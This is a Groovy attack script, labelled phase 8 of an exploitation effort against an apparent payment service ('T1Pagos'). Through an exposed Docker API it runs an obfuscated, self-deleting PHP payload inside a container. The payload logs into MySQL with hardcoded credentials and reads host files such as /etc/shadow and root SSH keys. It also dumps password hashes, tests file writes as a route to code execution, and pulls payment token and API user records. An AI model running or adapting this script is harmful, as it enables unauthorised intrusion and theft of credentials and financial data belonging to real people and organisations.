// Phase 8: T1Pagos ALL PRIVS exploitation - FILE + users + outfile + RCE path
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

echo "==============================================\\n";
echo "T1PAGOS EXPLOITATION — ALL PRIVILEGES\\n";
echo "==============================================\\n\\n";

$m = new mysqli("172.27.141.4", "adaxxidb", "JTQ6PrkecY3y1kVN", "", 3306);
if ($m->connect_error) { die("FAIL: ".$m->connect_error."\\n"); }
echo "CONNECTED as adaxxidb@% (ALL PRIVILEGES)\\n\\n";

// =====================================================
// 1. System variables and paths
// =====================================================
echo "===== [1] SYSTEM CONFIG =====\\n";
$vars = array("version", "hostname", "port", "datadir", "basedir", "secure_file_priv",
              "plugin_dir", "tmpdir", "log_error", "general_log_file", "slow_query_log_file",
              "innodb_data_home_dir", "system_time_zone", "server_id", "bind_address",
              "have_openssl", "have_ssl", "max_connections", "super_read_only");
foreach ($vars as $v) {
    $r = $m->query("SELECT @@$v val");
    if ($r) { $row = $r->fetch_assoc(); echo "$v = ".$row["val"]."\\n"; }
    else { echo "$v = ERROR (".$m->error.")\\n"; }
}

// =====================================================
// 2. LOAD_FILE - read host files
// =====================================================
echo "\\n===== [2] LOAD_FILE (host filesystem) =====\\n";
$files = array(
    "/etc/passwd", "/etc/hosts", "/etc/hostname", "/etc/my.cnf",
    "/root/.bash_history", "/root/.my.cnf", "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys", "/proc/1/cmdline", "/proc/net/tcp",
    "/proc/net/arp", "/proc/version", "/etc/shadow",
    "/var/lib/mysql/my.cnf", "/etc/mysql/my.cnf"
);
foreach ($files as $f) {
    $r = $m->query("SELECT LOAD_FILE('".$f."') AS c");
    if ($r) {
        $row = $r->fetch_assoc();
        if ($row["c"] !== null && strlen($row["c"]) > 0) {
            echo "\\n--- FILE_OK: $f (".strlen($row["c"])." bytes) ---\\n";
            $content = str_replace("\\x00", " ", $row["c"]);
            if (strlen($content) > 2500) $content = substr($content, 0, 2500)."\\n...[TRUNCATED]";
            echo $content."\\n";
        } else {
            echo "FILE_NULL|$f\\n";
        }
    } else {
        echo "FILE_ERR|$f|".$m->error."\\n";
    }
}

// =====================================================
// 3. MySQL users dump (password hashes)
// =====================================================
echo "\\n===== [3] MYSQL.USER DUMP =====\\n";
$r = $m->query("SELECT user, host, password, plugin, authentication_string, Super_priv, File_priv, Grant_priv FROM mysql.user ORDER BY user");
if ($r) {
    while ($row = $r->fetch_assoc()) {
        echo $row["user"]."@".$row["host"]." | PWD=".($row["password"]?:$row["authentication_string"])." | SUPER=".$row["Super_priv"]." FILE=".$row["File_priv"]." GRANT=".$row["Grant_priv"]."\\n";
    }
} else { echo "ERR: ".$m->error."\\n"; }

// =====================================================
// 4. INTO OUTFILE test (RCE path)
// =====================================================
echo "\\n===== [4] INTO OUTFILE TEST =====\\n";
$outpaths = array("/tmp/t1_pivot.txt", "/var/tmp/t1_pivot.txt", "/var/lib/mysql/t1_pivot.txt");
foreach ($outpaths as $op) {
    $r = $m->query("SELECT 'T1_PIVOT_RCE_OK' INTO OUTFILE '".$op."'");
    if ($r) {
        echo "OUTFILE_OK|$op\\n";
    } else {
        echo "OUTFILE_FAIL|$op|".$m->error."\\n";
    }
}

// =====================================================
// 5. Payment tables in tienda (T1Pagos data!)
// =====================================================
echo "\\n===== [5] PAYMENT TABLES =====\\n";
$r = $m->query("SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME LIKE '%t1%' ORDER BY TABLE_ROWS DESC LIMIT 20");
if ($r) { while ($row = $r->fetch_assoc()) { echo "  ".$row["TABLE_SCHEMA"].".".$row["TABLE_NAME"]." rows~".$row["TABLE_ROWS"]."\\n"; } }

echo "\\n--- tienda.tokent1envio (sample) ---\\n";
$r = $m->query("SELECT * FROM tienda.tokent1envio LIMIT 5");
if ($r) {
    $fields = $r->fetch_fields();
    $cols = array(); foreach ($fields as $f) { $cols[] = $f->name; }
    echo implode("|", $cols)."\\n";
    while ($row = $r->fetch_row()) { echo implode("|", $row)."\\n"; }
} else { echo "ERR: ".$m->error."\\n"; }

echo "\\n--- tienda.tokens (sample) ---\\n";
$r = $m->query("SELECT * FROM tienda.tokens LIMIT 5");
if ($r) {
    $fields = $r->fetch_fields();
    $cols = array(); foreach ($fields as $f) { $cols[] = $f->name; }
    echo implode("|", $cols)."\\n";
    while ($row = $r->fetch_row()) { echo implode("|", $row)."\\n"; }
} else { echo "ERR: ".$m->error."\\n"; }

echo "\\n--- tienda.usuarios_api (sample) ---\\n";
$r = $m->query("SELECT * FROM tienda.usuarios_api LIMIT 10");
if ($r) {
    $fields = $r->fetch_fields();
    $cols = array(); foreach ($fields as $f) { $cols[] = $f->name; }
    echo implode("|", $cols)."\\n";
    while ($row = $r->fetch_row()) { echo implode("|", $row)."\\n"; }
} else { echo "ERR: ".$m->error."\\n"; }

// =====================================================
// 6. Databases specific to T1Pagos
// =====================================================
echo "\\n===== [6] T1PAGOS-SPECIFIC DBs =====\\n";
$t1_dbs = array("admin_axii_devel", "metrofinanciera", "login_test", "customercentric", "dla", "vta");
foreach ($t1_dbs as $db) {
    echo "\\n--- $db ---\\n";
    $r = $m->query("SHOW TABLES FROM `$db`");
    if ($r && $r->num_rows > 0) {
        $count = 0;
        while ($row = $r->fetch_row()) { echo "  ".$row[0]."\\n"; $count++; if ($count >= 20) { echo "  ...more\\n"; break; } }
    } else { echo "  EMPTY/NO_ACCESS: ".$m->error."\\n"; }
}

$m->close();
echo "\\nPHASE8_COMPLETE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p8.php && php /tmp/_p8.php 2>&1; rm -f /tmp/_p8.php"

println "########## PHASE 8: T1PAGOS ALL PRIVS EXPLOIT ##########"
println execIn(cmd)
